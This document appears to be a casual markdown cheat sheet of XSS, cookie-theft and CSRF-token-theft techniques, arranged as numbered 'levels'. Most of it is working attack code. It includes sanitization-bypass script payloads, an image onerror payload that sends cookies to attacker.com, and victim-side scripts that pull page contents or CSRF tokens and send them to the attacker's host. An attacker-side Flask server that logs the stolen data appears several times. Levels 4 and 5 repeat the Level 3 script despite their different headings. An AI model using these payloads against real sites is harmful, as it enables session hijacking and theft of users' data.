# Hey! Here's some fun little snippets for when you're doing some yummy XSS, Cookie & CSRF Theft!

## External Script Source
Sometimes, you're going to need to host the malicious code the victim needs to execute. When this happens, don't panic! find a good payload and then link back to the script on one of your machines

The Victim Sees:

```
<script src="http://⭐/external"></script>
<iframe src="http://⭐/external" style="display:none;"></iframe>

<style>
    @import url("http://⭐/external");
</style>
```

The Attacker Hosts:

python -m http.server

with the malicious script in the directory, named external

```
script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://🌙/page', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://⭐:8000/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
```

This can be a bit confusing but stick with it! Its just three parts; the injection point, the malicious script and the activity log!


# 🐈‍⬛confirmation🐈‍⬛

confirm XSS >> `<script>alert(1)</script>`
alternate confirmation >> `“><script>alert(document.cookie)</script>`

## 🐈‍⬛sanitization bypass🐈‍⬛

    "><script >alert(document.cookie)</script >
    "><ScRiPt>alert(document.cookie)</ScRiPt>
    "%3cscript%3ealert(document.cookie)%3c/script%3e
    <scr<script>ipt>alert(document.cookie)</script>
    <script src="http://attacker/xss.js"></script>

## 🐈‍⬛Hide it in an "image"!🐈‍⬛

    <img src="invalid.jpg" onerror="document.location='http://attacker.com?cookie=' + document.cookie;">

after this you're on your own! there are a bunch of payloads for testing xss hahaha

# 🎃Level 1 - Give me your Cookie! 🎃

## ⭐ Attacker

`python -m http.server`

##🌙 Victim

`<script>
    location = 'http://⭐/?data=' + btoa(document.cookie);
</script>`

# 🎃Level 2 - Send me your whole page!🎃

## ⭐ Attacker

You can run this server because you're gonna get a bunch of base64 encoded data and its probably easier to decode it automatically than to mess about with cyberchef hahaha

`python server.py`

```
from flask import Flask, request
import datetime
import base64

app = Flask(__name__)

# Define the log route
@app.route('/log', methods=['GET'])
def log_request():
    # Get the data parameter from the request
    encoded_data = request.args.get('data', '')

    # Decode the base64-encoded data
    try:
        decoded_data = base64.b64decode(encoded_data).decode('utf-8')
    except Exception as e:
        decoded_data = f"Error decoding data: {e}"

    # Log the decoded data with a timestamp
    with open("requests.log", "a") as log_file:
        log_file.write(f"{datetime.datetime.now()}: {decoded_data}\n")

    return "Data logged and decoded successfully.", 200

# Run the app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

```

##🌙 Victim

```
script>
    var xhr = new XMLHttpRequest();
    xhr.open('GET', 'http://🌙/page', true);
    xhr.withCredentials = true;
    xhr.onload = () => {
      location = 'http://⭐:8000/log?data=' + btoa(xhr.response);
    };
    xhr.send();
</script>
```

# 🎃Level 3 - Give me just your token! 🎃

## ⭐ Attacker

`python server.py`

```
from flask import Flask, request
import datetime
import base64

app = Flask(__name__)

# Define the log route
@app.route('/log', methods=['GET'])
def log_request():
    # Get the data parameter from the request
    encoded_data = request.args.get('data', '')

    # Decode the base64-encoded data
    try:
        decoded_data = base64.b64decode(encoded_data).decode('utf-8')
    except Exception as e:
        decoded_data = f"Error decoding data: {e}"

    # Log the decoded data with a timestamp
    with open("requests.log", "a") as log_file:
        log_file.write(f"{datetime.datetime.now()}: {decoded_data}\n")

    return "Data logged and decoded successfully.", 200

# Run the app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

```

##🌙 Victim

Here, you need to find the variable name for the 🐱 token 🐱 you want to exfiltrate!

```
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://🌙/index.php', false);
xhr.withCredentials = true;
xhr.send();

var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var TokenB64 = doc.getElementById('🐱 token 🐱').value;
var Tokenstealer = btoa(TokenB64);  // Base64 encode the token

// Send the CSRF token to your logging server
var logXhr = new XMLHttpRequest();
logXhr.open('GET', 'http://⭐:8000/log?data=' + Tokenstealer, true);
logXhr.send();

</script>


```

# 🎃Level 4 - Victim, Send A Get Request! 🎃

## ⭐ Attacker

`python server.py`

```
from flask import Flask, request
import datetime
import base64

app = Flask(__name__)

# Define the log route
@app.route('/log', methods=['GET'])
def log_request():
    # Get the data parameter from the request
    encoded_data = request.args.get('data', '')

    # Decode the base64-encoded data
    try:
        decoded_data = base64.b64decode(encoded_data).decode('utf-8')
    except Exception as e:
        decoded_data = f"Error decoding data: {e}"

    # Log the decoded data with a timestamp
    with open("requests.log", "a") as log_file:
        log_file.write(f"{datetime.datetime.now()}: {decoded_data}\n")

    return "Data logged and decoded successfully.", 200

# Run the app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

```

##🌙 Victim

Here, you need to find the variable name for the 🐱 token 🐱 you want to exfiltrate!

```
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://🌙/index.php', false);
xhr.withCredentials = true;
xhr.send();

var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var TokenB64 = doc.getElementById('🐱 token 🐱').value;
var Tokenstealer = btoa(TokenB64);  // Base64 encode the token

// Send the CSRF token to your logging server
var logXhr = new XMLHttpRequest();
logXhr.open('GET', 'http://⭐:8000/log?data=' + Tokenstealer, true);
logXhr.send();

</script>


```

# 🎃Level 5 - Victim, Send a Post Request ! 🎃

## ⭐ Attacker

`python server.py`

```
from flask import Flask, request
import datetime
import base64

app = Flask(__name__)

# Define the log route
@app.route('/log', methods=['GET'])
def log_request():
    # Get the data parameter from the request
    encoded_data = request.args.get('data', '')

    # Decode the base64-encoded data
    try:
        decoded_data = base64.b64decode(encoded_data).decode('utf-8')
    except Exception as e:
        decoded_data = f"Error decoding data: {e}"

    # Log the decoded data with a timestamp
    with open("requests.log", "a") as log_file:
        log_file.write(f"{datetime.datetime.now()}: {decoded_data}\n")

    return "Data logged and decoded successfully.", 200

# Run the app
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000)

```

##🌙 Victim

Here, you need to find the variable name for the 🐱 token 🐱 you want to exfiltrate!

```
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://🌙/index.php', false);
xhr.withCredentials = true;
xhr.send();

var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var TokenB64 = doc.getElementById('🐱 token 🐱').value;
var Tokenstealer = btoa(TokenB64);  // Base64 encode the token

// Send the CSRF token to your logging server
var logXhr = new XMLHttpRequest();
logXhr.open('GET', 'http://⭐:8000/log?data=' + Tokenstealer, true);
logXhr.send();

</script>


```